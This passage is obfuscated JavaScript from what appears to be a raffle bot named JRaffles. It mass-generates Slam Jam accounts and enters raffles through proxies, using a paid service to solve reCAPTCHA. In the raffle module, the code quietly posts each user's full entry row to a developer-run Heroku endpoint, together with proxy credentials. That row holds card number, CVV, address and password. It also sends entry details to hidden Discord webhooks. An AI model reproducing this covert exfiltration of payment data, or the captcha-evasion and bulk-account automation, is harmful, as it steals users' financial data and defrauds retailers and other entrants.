                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20' + _0x2ddea7)), _0x10b947 = 'yes';
                        } finally {
                            _0x1379af && _0x1379af['close']();
                            if (_0x10b947 == 'yes' && _0x1a77c3 != 0x5 && _0x4e2328 != 'Size\x20Not\x20Found') {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1a77c3 + '\x20/\x205)')), _0x384089 = _0x384089 - 0x1, _0x1a77c3 = _0x1a77c3 + 0x1;
                                continue;
                            }
                            _0x10b947 == 'yes' && _0x1a77c3 >= 0x5 && (_0x2b505c(_0x26a694[_0x384089], _0x39c539), _0x10b947 = 'no', _0x1a77c3 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2369fd, _0x193a71, _0x3e5f25) {
                    _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x33c579['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x46852b = 0x0; _0x46852b < _0x193a71['length']; _0x46852b++) {
                        if (_0x42ff94 != 'yes')
                            var _0x42ff94 = '', _0x594f25 = 0x0;
                        var _0x45dadb = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ebc10
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x33c579['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ddf1c
                                }
                            ]
                        }];
                        const _0x54baf4 = { 'embeds': _0x45dadb };
                        _0x369d34(_0x2369fd['name'] + '\x20Task\x20' + (_0x46852b + 0x1) + '\x20/\x20' + _0x193a71['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                        try {
                            await _0x32ecbd(_0x193a71, _0x46852b);
                        } catch {
                            _0x42ff94 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5b1513 = await _0x4a5b92(_0x193a71[_0x46852b], _0x2369fd, 'acc', ![]);
                        const _0x57ed11 = { 'succesDEVMSG': { 'embeds': [_0x5b1513] } };
                        if (_0x193a71[_0x46852b]['Email'] == '' || _0x193a71[_0x46852b]['FirstName'] == '' || _0x193a71[_0x46852b]['LastName'] == '') {
                            console['log'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4b01dc(0x7d0);
                            continue;
                        }
                        (_0x193a71[_0x46852b]['Password'] == '' || _0x193a71[_0x46852b] == undefined) && _0x193a71[_0x46852b]['Password'] == 'JRaffles23!';
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0x473e40 = _0x3e5f25[_0x46852b]['split'](':');
                        else
                            var _0x233225 = Math['round'](Math['random']() * (_0x3e5f25['length'] - 0x1)), _0x473e40 = _0x3e5f25[_0x233225]['split'](':');
                        var _0x5b085f;
                        try {
                            _0x5b085f = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x473e40[0x0] + ':' + _0x473e40[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5b085f = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x473e40[0x0] + ':' + _0x473e40[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3f31fd = await _0x5b085f['newPage']();
                            await _0x3f31fd['authenticate']({
                                'username': '' + _0x473e40[0x2],
                                'password': '' + _0x473e40[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3f31fd['setRequestInterception'](!![]), _0x3f31fd['on']('request', _0x2a7e05 => {
                                _0x2a7e05['resourceType']() === 'image' || _0x2a7e05['resourceType']() === 'font' || _0x2a7e05['resourceType']() === 'media' ? _0x2a7e05['abort']() : _0x2a7e05['continue']();
                            }), await _0x3f31fd['goto']('https://drop.slamjam.com/account/register'), await _0x4b01dc(0xbb8), await _0x3f31fd['waitForSelector']('#FirstName'), await _0x3f31fd['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3f31fd['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Filling\x20information'), await _0x4b01dc(0x4b0), await _0x3f31fd['type']('#FirstName', '' + _0x193a71[_0x46852b]['FirstName']), await _0x4b01dc(0x226), await _0x3f31fd['type']('#LastName', '' + _0x193a71[_0x46852b]['LastName']), await _0x4b01dc(0x226), await _0x3f31fd['type']('#Email', '' + _0x193a71[_0x46852b]['Email']), await _0x4b01dc(0x2ee), await _0x3f31fd['type']('#ConfirmEmail', '' + _0x193a71[_0x46852b]['Email']), await _0x4b01dc(0x2ee), await _0x3f31fd['type']('#CreatePassword', '' + _0x193a71[_0x46852b]['Password']), await _0x4b01dc(0x2ee), await _0x3f31fd['type']('#CreateConfirmPassword', '' + _0x193a71[_0x46852b]['Password']), await _0x4b01dc(0x226), console['log'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Submitting..'), await _0x3f31fd['$eval']('#create_customer', _0x2d60fb => _0x2d60fb['submit']()), await _0x4b01dc(0x1388), console['log'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20' + _0xd12810['cyan']('Solving\x20Captcha')), await _0x3f31fd['solveRecaptchas'](), console['log'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3f31fd['$eval']('.shopify-challenge__container\x20>\x20form', _0x34244c => _0x34244c['submit']());
                            try {
                                await _0x3f31fd['waitForSelector']('.product-card__image'), await _0x4b01dc(0x1f4), _0x42ff94 = 'no', console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Account\x20' + _0x193a71[_0x46852b]['Email'] + '\x20Generated!')), _0x3f6207['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x193a71[_0x46852b]['Email'] + ',' + _0x193a71[_0x46852b]['Password']), console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Account\x20' + _0x193a71[_0x46852b]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x57ed11['succesDEVMSG']);
                                } catch {
                                }
                                await _0x265172(_0x1fa40c, _0x57ed11['succesDEVMSG']);
                            } catch (_0x591a15) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x591a15));
                            }
                        } catch (_0x232a0d) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20' + _0x232a0d));
                        } finally {
                            _0x5b085f && _0x5b085f['close']();
                            if (_0x42ff94 == 'yes' && _0x594f25 != 0x5) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x2369fd['name'] + ']\x20Task\x20' + (_0x46852b + 0x1) + '\x20:\x20Retrying\x20(' + _0x594f25 + '\x20/\x205)')), _0x46852b = _0x46852b - 0x1, _0x594f25 = _0x594f25 + 0x1;
                                continue;
                            }
                            _0x42ff94 == 'yes' && _0x594f25 >= 0x5 && (_0x2b505c(_0x193a71[_0x46852b], _0x2369fd), _0x42ff94 = 'no', _0x594f25 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3bb3c7, _0x227ae1, _0x13e8a0) {
                    _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x33c579['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x537780 = 0x0; _0x537780 < _0x227ae1['length']; _0x537780++) {
                        var _0x43e84c;
                        if (_0x78b6b0 != 'yes')
                            var _0x78b6b0 = '', _0x53b6c7 = 0x0;
                        _0x369d34(_0x3bb3c7['name'] + '\x20Task\x20' + (_0x537780 + 0x1) + '\x20/\x20' + _0x227ae1['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                        try {
                            await _0x32ecbd(_0x227ae1, _0x537780);
                        } catch {
                            _0x78b6b0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x227ae1[_0x537780]['Email'] == '' || _0x227ae1[_0x537780]['Password'] == '' || _0x227ae1[_0x537780]['FirstName'] == '' || _0x227ae1[_0x537780]['LastName'] == '') {
                            console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0x1a602d = _0x13e8a0[_0x537780]['split'](':');
                        else
                            var _0x22f3c9 = Math['round'](Math['random']() * (_0x13e8a0['length'] - 0x1)), _0x1a602d = _0x13e8a0[_0x22f3c9]['split'](':');
                        var _0x325412;
                        try {
                            _0x325412 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1a602d[0x0] + ':' + _0x1a602d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x325412 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1a602d[0x0] + ':' + _0x1a602d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x94a71f = await _0x325412['newPage']();
                            await _0x94a71f['authenticate']({
                                'username': '' + _0x1a602d[0x2],
                                'password': '' + _0x1a602d[0x3]
                            }), await _0x94a71f['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x94a71f['setRequestInterception'](!![]), _0x94a71f['on']('request', _0x3bea4f => {
                                _0x3bea4f['resourceType']() === 'image' || _0x3bea4f['resourceType']() === 'font' || _0x3bea4f['resourceType']() === 'media' ? _0x3bea4f['abort']() : _0x3bea4f['continue']();
                            }), await _0x94a71f['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x94a71f['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x94a71f['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4b01dc(0x258), await _0x94a71f['waitForSelector']('#CustomerEmail'), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x94a71f['type']('#CustomerEmail', '' + _0x227ae1[_0x537780]['Email']), await _0x4b01dc(0x12c), await _0x94a71f['type']('#CustomerPassword', '' + _0x227ae1[_0x537780]['Password']), await _0x4b01dc(0x226), await _0x94a71f['$eval']('#customer_login', _0x393048 => _0x393048['submit']()), await _0x4b01dc(0x7d0), await _0x94a71f['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20' + _0xd12810['cyan']('Solving\x20Captcha')), await _0x94a71f['solveRecaptchas'](), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x94a71f['$eval']('.shopify-challenge__container\x20>\x20form', _0x3725f6 => _0x3725f6['submit']());
                            try {
                                await _0x94a71f['waitForSelector']('.nav-account'), await _0x4b01dc(0x4b0);
                            } catch {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x94a71f['goto']('' + _0x227ae1[_0x537780]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4b01dc(0xbb8), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x94a71f['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x94a71f['click']('.product-select-variant-wrapper'), await _0x4b01dc(0x320), await _0x94a71f['click']('li.product-select-variant__value[data-size=\x22' + _0x227ae1[_0x537780]['Size'] + '\x22]'), await _0x4b01dc(0x384), await _0x94a71f['$eval']('#AddToCartForm-product-template-raffle', _0x2f8a79 => _0x2f8a79['submit']()), await _0x94a71f['waitForSelector']('.cart-order-summary__content'), await _0x4b01dc(0x514), await _0x94a71f['goto']('https://drop.slamjam.com/checkout'), await _0x4b01dc(0x514), await _0x94a71f['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x94a71f['select']('#checkout_shipping_address_country', '' + _0x227ae1[_0x537780]['Country']), await _0x4b01dc(0x200), await _0x94a71f['waitForSelector']('#checkout_shipping_address_first_name'), await _0x94a71f['type']('#checkout_shipping_address_first_name', '' + _0x227ae1[_0x537780]['FirstName']), await _0x4b01dc(0x237), await _0x94a71f['type']('#checkout_shipping_address_last_name', '' + _0x227ae1[_0x537780]['LastName']), await _0x4b01dc(0x1e0), await _0x94a71f['type']('#checkout_shipping_address_address1', _0x227ae1[_0x537780]['Address1'] + '\x20' + _0x227ae1[_0x537780]['HouseNumber']), await _0x4b01dc(0x514), await _0x94a71f['type']('#checkout_shipping_address_address2', '' + _0x227ae1[_0x537780]['Address2']), await _0x4b01dc(0x514);
                            _0x227ae1[_0x537780]['Postcode'] == undefined && (_0x227ae1[_0x537780]['Postcode'] = _0x227ae1[_0x537780]['Zip']);
                            await _0x94a71f['type']('#checkout_shipping_address_zip', '' + _0x227ae1[_0x537780]['Postcode']), await _0x4b01dc(0x2bc), await _0x94a71f['type']('#checkout_shipping_address_city', '' + _0x227ae1[_0x537780]['City']), await _0x4b01dc(0x320), await _0x94a71f['type']('#checkout_shipping_address_phone', '' + _0x227ae1[_0x537780]['Phone']), await _0x4b01dc(0x320), await _0x94a71f['click']('#continue_button'), await _0x4b01dc(0xbb8), await _0x94a71f['waitForSelector']('.summary-title'), await _0x4b01dc(0x320), await _0x94a71f['click']('#continue_button'), await _0x4b01dc(0x320), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x94a71f['waitForSelector']('#checkout_credit_card_vault'), await _0x4b01dc(0x3e8);
                            var _0x2493b2 = await _0x94a71f['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x173205 = await _0x2493b2['contentFrame']();
                            await _0x173205['click']('#number'), await _0x4b01dc(0x3e8), await _0x173205['type']('#number', '' + _0x227ae1[_0x537780]['CardNumber'], { 'delay': 0x78 }), _0x2493b2 = await _0x94a71f['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x173205 = await _0x2493b2['contentFrame'](), await _0x4b01dc(0x1c2), await _0x173205['click']('#name'), await _0x4b01dc(0x1f4), await _0x173205['type']('#name', '' + _0x227ae1[_0x537780]['NameOnCard'], { 'delay': 0x78 }), _0x2493b2 = await _0x94a71f['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x173205 = await _0x2493b2['contentFrame'](), await _0x4b01dc(0x1c2), await _0x173205['click']('#expiry'), await _0x4b01dc(0x1f4), await _0x173205['type']('#expiry', '' + _0x227ae1[_0x537780]['ExpiryDate'], { 'delay': 0x78 }), _0x2493b2 = await _0x94a71f['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x173205 = await _0x2493b2['contentFrame'](), await _0x4b01dc(0x1c2), await _0x173205['click']('#verification_value'), await _0x4b01dc(0x1f4), await _0x173205['type']('#verification_value', '' + _0x227ae1[_0x537780]['CVV'], { 'delay': 0x78 }), await _0x94a71f['$eval']('#accepts-flag-raffle', _0x8a5ab2 => _0x8a5ab2['click']()), await _0x4b01dc(0x7d0), console['log'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x94a71f['$eval']('#continue_button', _0x9b0b4f => _0x9b0b4f['click']()), await _0x4b01dc(0x1b58), await _0x94a71f['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x94a71f['$eval']('.edit_checkout.animate-floating-labels', _0x138ef8 => _0x138ef8['submit']()), await _0x4b01dc(0x7d0);
                            try {
                                await _0x94a71f['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x78b6b0 = 'no', _0x41d22(_0x227ae1[_0x537780], _0x3bb3c7), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2ebe92) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2ebe92['message']);
                            }
                            var _0x4242ff = await _0x4a5b92(_0x227ae1[_0x537780], _0x3bb3c7, 'dev', ![]), _0x2baea5 = await _0x4a5b92(_0x227ae1[_0x537780], _0x3bb3c7, 'pub', ![]);
                            let _0x19e0b9 = _0x227ae1[_0x537780];
                            try {
                                prxdata = {
                                    'username': _0x4ebc10['replace']('#', ''),
                                    'module': _0x3bb3c7['name'],
                                    'entrydata': JSON['stringify'](_0x19e0b9),
                                    'proxy': '' + _0x13e8a0[_0x537780]
                                };
                                var _0x39c9a8 = JSON['stringify'](prxdata);
                                let _0x1a365b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x39c9a8, _0x1a365b);
                            } catch (_0x4f06e1) {
                            }
                            const _0x3f6174 = {
                                'succesDEVMSG': { 'embeds': [_0x4242ff] },
                                'succesPUBMSG': { 'embeds': [_0x2baea5] }
                            };
                            try {
                                _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x3f6174['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x3f6174['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x3f6174['succesPUBMSG']);
                            } catch (_0x5a44b9) {
                                console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5a44b9));
                            }
                        } catch (_0x2176ab) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20' + _0x2176ab)), _0x43e84c = '' + _0x2176ab;
                            var _0x154ee7 = await _0x4a5b92(kickz[_0x537780], _0x3bb3c7, 'dev', !![], _0x43e84c);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x154ee7] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], EMBEDS['errorDEV']), await _0x265172(_0x3cc994, EMBEDS['errorDEV']), _0x78b6b0 = 'yes';
                        } finally {
                            _0x325412 && _0x325412['close']();
                            if (_0x78b6b0 == 'yes' && _0x53b6c7 != 0x5 && _0x43e84c != 'Size\x20Not\x20Found') {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3bb3c7['name'] + ']\x20Task\x20' + (_0x537780 + 0x1) + '\x20:\x20Retrying\x20(' + _0x53b6c7 + '\x20/\x205)')), _0x537780 = _0x537780 - 0x1, _0x53b6c7 = _0x53b6c7 + 0x1;
                                continue;
                            }
                            _0x78b6b0 == 'yes' && _0x53b6c7 >= 0x5 && (_0x2b505c(_0x227ae1[_0x537780], _0x3bb3c7), _0x78b6b0 = 'no', _0x53b6c7 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x5b7f6d) {
                    var _0x45c72f = await _0x2db9f0(), _0x3a5e3f = _0x3f6207['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x5b8f71 = _0x3a0f5b['parse'](_0x3a5e3f, { 'header': !![] })['data'];
                    for (var _0x169da8 = 0x0; _0x169da8 < _0x5b8f71['length']; _0x169da8++) {
                        var _0x324418 = _0x5b8f71[_0x169da8]['Store'], _0x15afa9 = _0x5b8f71[_0x169da8]['Mode'];
                        for (var _0x5531f0 of _0x5411d6) {
                            const _0x379ca1 = _0x5531f0['name']['includes'](_0x324418);
                            if (!_0x379ca1)
                                continue;
                            for (mode of _0x5531f0['modules']) {
                                if (mode['name'] == _0x15afa9) {
                                    console['log']('Running\x20' + _0xd12810['cyan'](mode['name'])), await mode['function'](mode, [_0x5b8f71[_0x169da8]], _0x45c72f);
                                    var _0x1d30f3 = _0x3a5e3f['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x3f6207['writeFileSync']('../failed-tasks.csv', _0x1d30f3);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5c6624 = await _0x15f555['get']('Answer');
                    if (_0x5c6624['Answer']['toLowerCase']() == 'y') {
                        _0x3f6207['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x4b01dc(0x3e8);
                        return;
                    }
                    if (_0x5c6624['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x4b01dc(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x4b01dc(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x4b0281(_0x5a5216) {
    var _0x3e5554 = await _0x2db9f0(), _0x590b34 = _0x3f6207['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x5eaaea = _0x3a0f5b['parse'](_0x590b34, { 'header': !![] })['data'];
    for (var _0x63f603 = 0x0; _0x63f603 < _0x5eaaea['length']; _0x63f603++) {
        var _0x4202d0 = _0x5eaaea[_0x63f603]['Store'], _0xa1b67e = _0x5eaaea[_0x63f603]['Mode'];
        for (var _0xad1a25 of _0x5411d6) {
            const _0x367f4c = _0xad1a25['name']['includes'](_0x4202d0);
            if (_0x367f4c)
                for (mode of _0x5411d6[_0xad1a25]['modules']) {
                    const _0x22f1f5 = mode['name']['includes'](_0xa1b67e);
                    _0x22f1f5 && (_0x5a5216 = mode['name'], await mode['function'](_0x5a5216, _0x5eaaea[_0x63f603], _0x3e5554));
                }
        }
    }
}
async function _0x5589bf() {
    await _0x45339b(), console['clear']();
    _0x33c579['threads'] > 0x5 && (_0x33c579['threads'] = 0x5);
    if (_0x5ddf1c != 'devkey' && _0x5ddf1c != 'devhook') {
        let _0x56536d = await _0x50e0a5['autoUpdate']();
        if (_0x56536d === 'yes')
            return _0x2b82f5('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x4faa3d == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4b01dc(0x2710);
        ;
    }
    await _0x14f9e4(_0x4faa3d);
    if (_0x28bb6b === ![])
        return console['log']('Closing\x20Browser'), await _0x4b01dc(0xbb8);
    else
        try {
            var _0x3b1c38 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x4ebc10
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5ddf1c
                    }
                ]
            }];
            const _0x3f411c = { 'embeds': _0x3b1c38 };
            var _0x2661c8 = await _0x4a5b92(null, null, 'open', ![]);
            const _0x512709 = { 'openDEVMSG': { 'embeds': [_0x2661c8] } };
            await _0x265172(_0x5abdef, _0x512709['openDEVMSG']);
            async function _0x3f9947() {
                _0x369d34('JRaffles\x20' + _0x5ddf1c), console['clear'](), console['log']('Hello\x20' + _0xd12810['cyan']('' + _0x4ebc10) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x5ddf1c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1e8452 = 0x0; _0x1e8452 < _0x5411d6['length'] - 0x4; _0x1e8452++) {
                    if (_0x1e8452 >= 0xa) {
                        console['log']('\x20(' + _0x1e8452 + ')\x20[' + _0x5411d6[_0x1e8452]['name'] + ']');
                        continue;
                    }
                    if (_0x5411d6[_0x1e8452]['name'] === 'Reload\x20Settings' || _0x5411d6[_0x1e8452]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1e8452 + ')\x20\x20[' + _0x5411d6[_0x1e8452]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x5411d6['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x5411d6['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x5411d6['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x5411d6['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x51a586();
                if (taskModule > _0x5411d6['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4b01dc(0x3e8), _0x3f9947();
                if (_0x5411d6[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                    var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x4c956b = await _0x2db9f0();
                            await _0x5460cd['function'](_0x5460cd, _0x4c956b);
                        }
                        if (taskFunction == 0x2) {
                            var _0x4c956b = await _0x2db9f0(), _0x7ef33e = _0x3f6207['readFileSync']('pr.txt', 'utf-8')['split']('\x0a');
